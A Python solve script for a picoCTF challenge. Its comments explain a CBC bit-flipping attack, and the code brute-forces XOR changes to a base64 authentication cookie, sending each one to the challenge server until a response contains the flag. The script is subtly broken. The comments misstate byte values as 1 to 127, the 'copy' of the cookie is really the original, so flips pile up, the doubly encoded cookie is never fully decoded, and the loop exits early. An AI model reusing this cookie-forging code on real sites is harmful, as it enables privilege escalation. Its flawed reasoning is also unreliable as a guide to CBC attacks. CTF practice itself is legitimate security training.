#we notice in the challenge description the letters C B C are capitalized, referring to the CBC (cipher block chaining)
#the cookie auth_name looks b64 encoded(it has = in the end which indicates base64 padding),
#the second hint suggest that we will try to becom admin. We'll have to write a script
#that flips each bit at a time, we'll try to xor each byte block with every number from 1 to 127 (byte = 8bits meaning
#possible values for a byte are from 1 to 127), this will flip each bit of the original byte, the goal is to try to flip the
#bit that indicates that we have admin access, the python script below gives us the flag. 
import requests
from base64 import b64encode
from base64 import b64decode
b64_cookie="MGRzSVJKdy9LQXJzN0Y0cVRySUsyUER3MVBFdUgyMC82UWVFNW9nejQvTURkbUgvTndMRWFGY2l0ZWgwZGNDSFFOYlcrcElGRjZHd0F0ZEZ3UGcxb3F4TG14eWd1ajdtNm1VZzBsSkFMYkNoTFJxUmFSMm9OT2FJaUxvQ3hPdkk="
original_cookie=bytearray(b64decode(b64_cookie))
def bitflip(bytepos:int, bitpos:int) -> str:
    cookie_copy=original_cookie
    cookie_copy[bytepos]=cookie_copy[bytepos]^bitpos
    cookie_copy=b64encode(cookie_copy)
    return cookie_copy.decode("utf-8")
for bytepos in range(len(original_cookie)):
    for bitpos in range(128):
        cookie=bitflip(bytepos,bitpos)
        sent_cookie={"auth_name": cookie}
        request=requests.get("http://mercury.picoctf.net:56136/", cookies=sent_cookie)
        text=request.text.lower()
        if "picoctf{" in text:
            print(request.text)
            break
        

